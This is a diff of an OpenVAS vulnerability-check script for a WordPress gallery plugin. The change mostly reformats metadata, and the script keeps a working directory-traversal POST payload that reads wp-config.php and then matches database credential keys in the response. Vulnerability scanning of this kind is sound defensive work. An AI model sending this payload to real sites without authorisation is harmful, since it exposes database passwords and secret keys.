@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_wordpress_grand_fia_gallery_plugin_dir_trav_vuln.nasl 7161 2017-09-18 07:43:57Z cfischer $
+# $Id: gb_wordpress_grand_fia_gallery_plugin_dir_trav_vuln.nasl 11987 2018-10-19 11:05:52Z mmartin $
 #
 # WordPress GRAND Flash Album Gallery Plugin Multiple Vulnerabilities
 #
@@ -24,43 +24,21 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-tag_impact = "Successful exploitation could allow attackers to read arbitrary
-files via directory traversal attacks and gain sensitive information via SQL
-Injection attack.
-
-Impact Level: Application";
-
-tag_affected = "WordPress GRAND Flash Album Gallery Version 0.55.";
-
-tag_insight = "The flaws are due to
-- input validation error in 'want2Read' parameter to 'wp-content/plugins/
-  flash-album-gallery/admin/news.php', which allows attackers to read
-  arbitrary files via a ../(dot dot) sequences.
-- improper validation of user-supplied input via the 'pid' parameter to
-  'wp-content/plugins/flash-album-gallery/lib/hitcounter.php', which allows
-  attackers to manipulate SQL queries by injecting arbitrary SQL code.";
-
-tag_solution = "Upgrade to version 1.76 or later,
-For updates refer to http://wordpress.org/extend/plugins/flash-album-gallery";
-
-tag_summary = "This host is installed with WordPress GRAND Flash Album Gallery
-Plugin and is prone to multiple vulnerabilities.";
-
 CPE = "cpe:/a:wordpress:wordpress";
 
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.802015");
-  script_version("$Revision: 7161 $");
-  script_tag(name:"last_modification", value:"$Date: 2017-09-18 09:43:57 +0200 (Mon, 18 Sep 2017) $");
+  script_version("$Revision: 11987 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-10-19 13:05:52 +0200 (Fri, 19 Oct 2018) $");
   script_tag(name:"creation_date", value:"2011-04-22 16:38:12 +0200 (Fri, 22 Apr 2011)");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
   script_name("WordPress GRAND Flash Album Gallery Plugin Multiple Vulnerabilities");
-  script_xref(name : "URL" , value : "http://secunia.com/advisories/43648/");
-  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/16947/");
-  script_xref(name : "URL" , value : "http://www.htbridge.ch/advisory/file_content_disclosure_in_grand_flash_album_gallery_wordpress_plugin.html");
-  script_xref(name : "URL" , value : "http://www.htbridge.ch/advisory/sql_injection_in_grand_flash_album_gallery_wordpress_plugin.html");
+  script_xref(name:"URL", value:"http://secunia.com/advisories/43648/");
+  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/16947/");
+  script_xref(name:"URL", value:"http://www.htbridge.ch/advisory/file_content_disclosure_in_grand_flash_album_gallery_wordpress_plugin.html");
+  script_xref(name:"URL", value:"http://www.htbridge.ch/advisory/sql_injection_in_grand_flash_album_gallery_wordpress_plugin.html");
 
   script_tag(name:"qod_type", value:"remote_vul");
   script_category(ACT_ATTACK);
@@ -69,16 +47,29 @@ if(description)
   script_dependencies("secpod_wordpress_detect_900182.nasl");
   script_require_ports("Services/www", 80);
   script_mandatory_keys("wordpress/installed");
-  script_tag(name : "impact" , value : tag_impact);
-  script_tag(name : "affected" , value : tag_affected);
-  script_tag(name : "insight" , value : tag_insight);
-  script_tag(name : "solution" , value : tag_solution);
-  script_tag(name : "summary" , value : tag_summary);
+  script_tag(name:"impact", value:"Successful exploitation could allow attackers to read arbitrary
+files via directory traversal attacks and gain sensitive information via SQL
+Injection attack.");
+  script_tag(name:"affected", value:"WordPress GRAND Flash Album Gallery Version 0.55.");
+  script_tag(name:"insight", value:"The flaws are due to
+
+  - input validation error in 'want2Read' parameter to 'wp-content/plugins/
+  flash-album-gallery/admin/news.php', which allows attackers to read
+  arbitrary files via a ../(dot dot) sequences.
+
+  - improper validation of user-supplied input via the 'pid' parameter to
+  'wp-content/plugins/flash-album-gallery/lib/hitcounter.php', which allows
+  attackers to manipulate SQL queries by injecting arbitrary SQL code.");
+  script_tag(name:"solution", value:"Upgrade to version 1.76 or later.");
+  script_tag(name:"solution_type", value:"VendorFix");
+  script_tag(name:"summary", value:"This host is installed with WordPress GRAND Flash Album Gallery
+Plugin and is prone to multiple vulnerabilities.");
+  script_xref(name:"URL", value:"http://wordpress.org/extend/plugins/flash-album-gallery");
   exit(0);
 }
 
 include("http_func.inc");
-include("http_keepalive.inc");
+
 include("host_details.inc");
 
 if(!port = get_app_port(cpe:CPE))exit(0);
@@ -90,7 +81,6 @@ host = http_host_name( port:port );
 postData = "want2Read=..%2F..%2F..%2F..%2Fwp-config.php&submit=submit";
 path = dir + "/wp-content/plugins/flash-album-gallery/admin/news.php";
 
-## Construct attack post request
 req = string("POST ", path, " HTTP/1.1\r\n",
              "Host: ", host, "\r\n",
              "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
@@ -101,7 +91,6 @@ req = string("POST ", path, " HTTP/1.1\r\n",
 ## Send post request and Receive the response
 res = http_send_recv(port:port, data:req);
 
-## Check for patterns present in wp-config.php file in the response
 if(ereg(pattern:"^HTTP/[0-9]\.[0-9] 200 .*", string:res) && "DB_NAME" ><
    res && "DB_USER" >< res && "DB_PASSWORD" >< res && "AUTH_KEY" >< res)
 {
